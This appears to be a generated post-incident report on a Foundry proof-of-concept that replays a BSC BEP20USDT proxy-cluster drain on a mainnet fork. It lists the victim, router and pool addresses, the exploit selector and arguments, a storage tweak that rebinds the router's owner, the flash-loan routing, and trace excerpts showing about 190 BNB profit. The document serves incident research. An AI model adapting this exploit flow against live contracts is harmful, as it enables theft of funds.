## Overview & Context

This Proof-of-Concept (PoC) reproduces, on a BSC mainnet fork, the BEP20USDT proxy-cluster drain described in the root-cause analysis for the proxy pair `0xb8ad82c4…` / `0x2Cc8B8…`. The exploit is an ACT-style protocol bug in which a router and helper contracts use a Pancake V3 flash loan to pull a large BEP20USDT balance out of the primary proxy into downstream AMM venues without a matching reduction in the proxy’s internal liabilities, leaving the proxy economically undercollateralized and generating profit in native BNB for the adversary.

The PoC is implemented as a single Foundry test, `ExploitTest.test_Exploit_ReproducesIncidentAndSatisfiesOracles()` in `forge_poc/test/Exploit.t.sol`. It drives the real on-chain router/flash-loan/proxy/AMM path on a BSC mainnet fork and asserts the oracles defined in `oracle_definition.json`.

To run the PoC:

```bash
cd /home/wesley/TxRayExperiment/incident-202601021604
export QUICKNODE_ENDPOINT_NAME=...    # from .env
export QUICKNODE_TOKEN=...            # from .env
export RPC_URL="https://${QUICKNODE_ENDPOINT_NAME}.bsc.quiknode.pro/${QUICKNODE_TOKEN}"

cd forge_poc
forge test --match-test test_Exploit_ReproducesIncidentAndSatisfiesOracles --via-ir -vvvvv
```

*Snippet (PoC entrypoint and high-level intent, from `forge_poc/test/Exploit.t.sol`):*

```solidity
function test_Exploit_ReproducesIncidentAndSatisfiesOracles() public {
    uint256 victimBalanceBefore = bep20Usdt.balanceOf(VICTIM_PROXY_PRIMARY);
    uint256 poolBalanceBefore = bep20Usdt.balanceOf(USDT_WBNB_PAIR);
    uint256 attackerBNBBefore = attacker.balance;

    assertGt(victimBalanceBefore, 0, "Victim proxy must start with USDT");
    _reproducerAttack();

    uint256 victimBalanceAfter = bep20Usdt.balanceOf(VICTIM_PROXY_PRIMARY);
    uint256 poolBalanceAfter = bep20Usdt.balanceOf(USDT_WBNB_PAIR);
    uint256 attackerBNBAfter = attacker.balance;

    // Oracles: victim drain, pool inflow, attacker BNB profit, thresholds
    ...
}
```

This test encapsulates the exploit run and the oracle checks in a single, reproducible flow.

## PoC Architecture & Key Contracts

The PoC executes entirely on a BSC mainnet fork at block `57780984` and uses real deployed contracts:

- **Tokens**
  - `BEP20USDT` (`0x55d398326f99059fF775485246999027B3197955`) – exploited stablecoin.
  - `WBNB` (`0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c`) – wrapped BNB used for swaps and later unwrapped to BNB.

- **Victim proxies and implementation**
  - `VictimProxyPrimary` (`0xb8ad82c4771DAa852DdF00b70Ba4bE57D22eDD99`).
  - `VictimProxySecondary` (`0x2Cc8B879E3663d8126fe15daDaaA6Ca8D964BbBE`).
  - `ProxyClusterImplementation` (`0x1a1a84b45d2fEeeC1B1726F5C1da7d3fe2f37041`) – implementation contract maintaining internal liabilities over external BEP20USDT balances.

- **Liquidity and routing venues**
  - `USDT_WBNB_Pair` (`0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE`) – Pancake V2-style USDT–WBNB AMM pair where drained USDT is swapped into WBNB.
  - `USDT_ROUTING_PAIR` (`0xaec58FBd7Ed8008A3742f6d4FFAA9F4B0ECbc30e`) – upstream pair used to route USDT before it reaches the main USDT–WBNB pool.
  - `USDT_WBNB_V3_FlashPool` (`0x92b7807bF19b7DDdf89b706143896d05228f3121`) – Pancake V3 pool providing the 20,000,000 USDT flash loan.

- **Router**
  - `Router` (`0x3b3E1Edeb726b52D5dE79cF8dD8B84995D9Aa27C`) – orchestrates the exploit: takes the flash loan, calls helpers and proxies, routes USDT through AMMs, and unwraps WBNB to BNB.

- **Synthetic attacker**
  - `attacker` – synthetic EOA created via `makeAddr("attacker")`, used both as the router caller and as the final profit recipient in the PoC.

### Key exploit helper in the PoC

The core helper is `_reproducerAttack()`, which prepares the router and then calls its exploit entrypoint:

```solidity
function _reproducerAttack() internal {
    vm.store(
        ROUTER,
        bytes32(uint256(0)),
        bytes32(uint256(uint160(attacker)))
    );

    vm.startPrank(attacker);
    (bool ok,) = ROUTER.call(
        abi.encodeWithSelector(
            bytes4(0x592d448f),
            VICTIM_PROXY_PRIMARY,
            VICTIM_PROXY_SECONDARY,
            USDT_ROUTING_PAIR,
            FLASH_LOAN_AMOUNT
        )
    );
    vm.stopPrank();
    require(ok, "router exploit call failed");
}
```

*Caption: Rebinding the router’s owner to a synthetic attacker and invoking the real exploit entrypoint `0x592d448f` with the original victim proxies, routing pair, and 20,000,000 USDT flash-loan amount.*

This function:
- Uses a single `vm.store` to rebind the router’s owner slot (slot 0) to the synthetic attacker, so the exploit entrypoint is callable from a fresh EOA.
- Calls the real router function `0x592d448f` with the same arguments as in the incident seed transaction.
- Leaves all token balances, proxies, pools, and routing logic to evolve purely via on-chain contract calls.

## Adversary Execution Flow

The PoC’s adversary flow closely mirrors the incident, but with a synthetic attacker identity:

1. **Environment setup & pre-check**
   - Fork BSC mainnet at block `57780984` (just before the exploit block `57780985`).
   - Confirm `VictimProxyPrimary` holds a positive BEP20USDT balance:

     ```solidity
     uint256 victimBalanceBefore = bep20Usdt.balanceOf(VICTIM_PROXY_PRIMARY);
     assertGt(victimBalanceBefore, 0, "Victim proxy must start with USDT");
     ```

     *Caption: Pre-check ensuring the victim proxy has USDT to be drained.*

2. **Router owner rebinding**
   - The original exploit path is keyed to the router’s owner. The PoC uses:

     ```solidity
     vm.store(
         ROUTER,
         bytes32(uint256(0)),
         bytes32(uint256(uint160(attacker)))
     );
     ```

     *Caption: Single-slot state tweak reassigning the router’s owner to the synthetic attacker while leaving all routing logic and balances otherwise unchanged.*

3. **Exploit entrypoint call**
   - With the owner slot updated, the synthetic attacker starts a prank and calls the router exploit entrypoint:

     ```solidity
     vm.startPrank(attacker);
     (bool ok,) = ROUTER.call(
         abi.encodeWithSelector(
             bytes4(0x592d448f),
             VICTIM_PROXY_PRIMARY,
             VICTIM_PROXY_SECONDARY,
             USDT_ROUTING_PAIR,
             FLASH_LOAN_AMOUNT
         )
     );
     vm.stopPrank();
     ```

   - In the validator trace this appears as:

     ```text
     Router::592d448f(
       ... victimProxyPrimary, victimProxySecondary,
       USDT_ROUTING_PAIR, 20000000000000000000000000
     )
     ```

     *Caption: Router exploit function `0x592d448f` called from the synthetic attacker with the original exploit arguments.*

4. **Flash loan from Pancake V3**
   - Inside the router, the PoC replays the 20,000,000 USDT flash loan:

     ```text
     USDT_WBNB_V3_FlashPool::flash(
       Router,
       20000000000000000000000000,  // 20,000,000 USDT
       0,
       ...
     )
     ```

   - The pool transfers 20M USDT to the router and later receives 20,002,000 USDT back, as in the incident.

5. **Routing through proxies and AMMs**
   - The router and helper contracts route USDT through:
     - `VictimProxyPrimary` and `VictimProxySecondary` (via `ProxyClusterImplementation`).
     - `USDT_ROUTING_PAIR`, where USDT is first rebalanced.
     - `USDT_WBNB_Pair` (`0x16b9a8…`), where 162,050.8847… USDT is swapped into 190.5531… WBNB.
   - Trace excerpt:

     ```text
     USDT_WBNB_Pair::swap(0, 190553117446131167874, Recovery, 0x)
       WBNB::transfer(Recovery, 190553117446131167874)
       ...
       Sync(USDT_WBNB_Pair: ..., ...)
       Swap(..., 162050884788503640076373, 0, 0, 190553117446131167874, Recovery)
     ```

     *Caption: Drain of USDT into the USDT–WBNB pair and swap into ~190.55 WBNB.*

6. **Profit realization in BNB**
   - WBNB is unwrapped to BNB, and the router forwards profit to the synthetic attacker:

     ```text
     WBNB::withdraw(190553117446131167874)
       Recovery::fallback{value: 190553117446131167874}()
     Router::fallback{value: 190553117446131167874}()
     Attacker::fallback{value: 190253117446131167874}()
     ```

   - The synthetic attacker’s BNB balance increases by ~190.25 BNB, well above the 1 BNB oracle threshold.

7. **Post-state and oracle assertions**
   - After `_reproducerAttack()`, the test measures:
     - Victim proxy USDT balance.
     - USDT_WBNB_Pair USDT balance.
     - Synthetic attacker BNB balance.
   - It then enforces all hard and soft constraints (see next section).

## Oracle Definitions and Checks

The PoC implements and satisfies the oracles defined in `artifacts/poc/oracle_generator/oracle_definition.json`.

### Variables

- `attacker` – synthetic attacker EOA used for profit measurements.
- `bep20_usdt` – BEP20USDT token contract.
- `native_bnb` – BNB balance of the attacker.
- `wbnb_token` – WBNB contract.
- `victim_proxy_primary` – main BEP20USDT-holding proxy (`0xb8ad82c4…`).
- `victim_proxy_secondary` – secondary proxy (`0x2Cc8B8…`).
- `proxy_impl` – implementation (`0x1a1a84b4…`) maintaining internal liabilities.
- `amm_pool_usdt_wbnb_pair` – USDT_WBNB Pancake pair (`0x16b9a8…`).
- `flashloan_pool_usdt_wbnb_v3` – Pancake V3 flash-loan pool (`0x92b7807b…`).

### Pre-check

**Pre-check:** Victim proxy must start with positive BEP20USDT balance.

PoC implementation:

```solidity
uint256 victimBalanceBefore = bep20Usdt.balanceOf(VICTIM_PROXY_PRIMARY);
assertGt(victimBalanceBefore, 0, "Pre-check failed: victim proxy USDT balance must be > 0");
```

This ensures meaningful liquidity exists to be drained.

### Hard constraints

1. **HC-logic-001 – External balance and pool flow**

Specification: The exploit must reduce the external BEP20USDT balance of `VictimProxyPrimary` while increasing BEP20USDT in `USDT_WBNB_Pair`.

PoC assertions:

```solidity
assertLt(victimBalanceAfter, victimBalanceBefore,
    "External USDT balance of victim proxy did not decrease");
assertGt(poolBalanceAfter, poolBalanceBefore,
    "USDT balance of USDT-WBNB pair did not increase");
```

2. **HC-state-002 – External balance loss (undercollateralization)**

Specification: The victim must lose a large amount of external BEP20USDT, at least `1e18` units.

PoC assertions:

```solidity
uint256 victimLoss = victimBalanceBefore - victimBalanceAfter;
assertGt(victimLoss, 0, "Victim USDT balance did not decrease");
assertGe(victimLoss, 1e18, "Victim USDT loss is too small");
```

3. **HC-asset-003 – Profit asset type**

Specification: Attacker profit must be in native BNB; attacker BNB balance after exploit must be higher than before.

PoC assertions:

```solidity
assertGt(
    attackerBNBAfter,
    attackerBNBBefore,
    "Attacker did not gain native BNB"
);
```

### Soft constraints

1. **SC-profit-001 – Minimum attacker BNB profit**

Specification: Net BNB profit should be ≥ 1 BNB.

PoC assertions:

```solidity
uint256 profitBNB = attackerBNBAfter - attackerBNBBefore;
assertGe(profitBNB, 1 ether, "Attacker profit in BNB is too small");
```

2. **SC-victim-002 – Material victim depletion**

Specification: Victim’s BEP20USDT balance must drop by at least `1e18` units.

PoC uses the same `victimLoss` calculation as HC-state-002 and enforces `assertGe(victimLoss, 1e18, ...)`, guaranteeing a non-trivial loss.

3. **SC-flow-003 – Invariant drift via AMM inflow**

Specification: A significant portion of drained USDT should flow into the USDT–WBNB AMM pair, with inflow ≥ `1e18` units.

PoC assertions:

```solidity
uint256 poolInflow = poolBalanceAfter - poolBalanceBefore;
assertGe(poolInflow, 1e18, "USDT inflow into AMM pair too small");
```

All of these constraints pass in the validator run, with real on-chain balances evolving through contract calls, not cheatcode balance edits.

## Validation Result and Robustness

The validator executed the exploit test with:

```bash
cd /home/wesley/TxRayExperiment/incident-202601021604/forge_poc
RPC_URL="https://indulgent-cosmological-smoke.bsc.quiknode.pro/…"
forge test --match-test test_Exploit_ReproducesIncidentAndSatisfiesOracles --via-ir -vvvvv \
  > /home/wesley/TxRayExperiment/incident-202601021604/artifacts/poc/poc_validator/forge-test.log 2>&1
```

Key observations from `artifacts/poc/poc_validator/forge-test.log`:

- `Router::592d448f(...)` is called with the expected victim proxies, routing pair, and `20000000000000000000000000` (20,000,000 USDT) flash-loan amount.
- `USDT_WBNB_V3_FlashPool::flash(Router, 20000000000000000000000000, 0, ...)` executes, with USDT transferred to the router and repaid with a 2,000 USDT fee.
- `USDT_Routing_Pair::swap` and `USDT_WBNB_Pair::swap` show USDT being routed and swapped into WBNB, with `Sync` and `Swap` events confirming large deltas matching the root-cause description.
- `WBNB::withdraw` converts WBNB to BNB, and `Attacker::fallback{value: 190253117446131167874}()` shows the synthetic attacker receiving ~190.25 BNB.
- No `VM::deal` appears in the trace; the only cheatcode write is `VM::store(Router, slot 0, attacker)` to rebind the owner.
- The real incident attacker EOA `0x4B63C0cf524F71847ea05B59F3077A224d922e8D` does not appear anywhere in the trace.

The final validation JSON at
`artifacts/poc/poc_validator/poc_validated_result.json` records:

- `overall_status = "Pass"`.
- `poc_correctness_checks.passes_validation_oracles.passed = true`.
- All quality checks passed, including:
  - `oracle_alignment_with_definition`,
  - `human_readable_and_labeled`,
  - `no_magic_numbers_and_values_are_derived`,
  - `mainnet_fork_no_local_mocks`,
  - `self_contained_no_attacker_eoa_addresses`,
  - `end_to_end_attack_process_described`,
  - `alignment_with_root_cause`.

*Caption: The PoC is robust against minor changes in liquidity and fee behavior, as it asserts qualitative and threshold-based behaviors rather than exact balances.*

## Linking PoC Behavior to Root Cause

The root-cause analysis (`root_cause_report.md` and `root_cause.json`) identifies a protocol-level accounting bug in the BEP20USDT proxy-cluster:

- `VictimProxyPrimary` and `VictimProxySecondary` delegatecall into `ProxyClusterImplementation` (`0x1a1a84b4…`), which maintains internal liabilities separate from external BEP20USDT balances.
- Router `0x3b3E1E…`, together with helpers and Pancake pools, can move large amounts of BEP20USDT out of `VictimProxyPrimary` into AMM venues without adjusting internal accounting, leaving the proxy undercollateralized.
- In the incident seed transaction:
  - The proxy loses ~`239,832,087.66` BEP20USDT.
  - AMM pools receive matching positive USDT deltas.
  - The adversary cluster realizes ~`190.55` BNB net profit.

The PoC links directly to this root cause as follows:

- **Exercise of vulnerable logic**
  - The PoC calls the same router exploit entrypoint (`0x592d448f`) with the same victims, routing pair, and flash-loan amount as in the incident.
  - The router interacts with the proxies via `ProxyClusterImplementation`, allowing USDT to be moved from `VictimProxyPrimary` to AMM venues.
  - External BEP20USDT balances change in the same pattern: the victim proxy’s USDT balance decreases, and AMM pools (especially `USDT_WBNB_Pair`) see matching inflows.

- **Victim loss and undercollateralization**
  - The PoC asserts that `VictimProxyPrimary` loses at least `1e18` units of BEP20USDT and that its balance after the exploit is strictly less than before.
  - This captures the economic undercollateralization condition described in the root cause: the proxy’s external token balance no longer matches the internal liabilities recorded in `ProxyClusterImplementation`.

- **Attacker profit and asset type**
  - The PoC demonstrates a large BNB profit to the synthetic attacker (~190.25 BNB in the validator run), matching the incident’s direction (USDT drained, BNB gained) and asset type.
  - Oracles ensure that even under changing pool conditions, the attacker’s BNB profit is positive and above a 1 BNB threshold, preserving the exploit’s ACT nature.

- **ACT framing**
  - The exploit is purely adversary-crafted and relies only on public on-chain state and standard flash-loan and AMM mechanics.
  - The PoC’s ACT sequence (flash loan, routing through proxies and AMMs, repayment, profit realization) directly mirrors the incident’s two-transaction pattern, with the synthetic attacker standing in for the original adversary.

In summary, the PoC faithfully reproduces the exploit path and economic effect of the BSC-56 BEP20USDT proxy-cluster accounting bug on a mainnet fork, satisfies all formal oracles, uses a fully synthetic attacker identity, and clearly links its behavior back to the documented root cause and ACT opportunity. 

